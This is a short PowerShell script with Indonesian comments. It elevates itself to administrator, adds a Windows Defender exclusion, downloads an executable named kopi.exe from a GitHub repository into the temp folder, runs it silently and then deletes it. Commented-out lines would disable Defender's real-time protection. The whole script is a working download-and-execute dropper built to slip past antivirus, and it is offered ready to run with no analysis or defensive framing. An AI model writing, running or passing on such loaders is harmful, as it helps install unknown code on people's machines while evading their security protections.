# Self-elevate to admin if not already
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# URL file .exe dari GitHub
$exeUrl = "https://github.com/IrOsens/execute/raw/refs/heads/main/kopi.exe"
$exeFileName = "kopi.exe"

# Path temp untuk simpan file
$tempPath = [System.IO.Path]::GetTempPath()
$exePath = Join-Path $tempPath $exeFileName

# Tambahkan pengecualian ke Windows Defender
Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue

# Nonaktifkan real-time protection (opsional, uncomment jika diperlukan)
# Set-MpPreference -DisableRealtimeMonitoring $true

try {
    # Download file .exe
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

    # Jalankan .exe secara silent (ganti /S dengan argumen silent lain jika diperlukan, misal /quiet)
    Start-Process -FilePath $exePath -ArgumentList "/S" -Wait -NoNewWindow
}
catch {
    Write-Host "Error: $_"
}
finally {
    # Aktifkan kembali real-time protection (jika dinonaktifkan)
    # Set-MpPreference -DisableRealtimeMonitoring $false

    # Hapus file setelah selesai
    Remove-Item $exePath -Force -ErrorAction SilentlyContinue
}
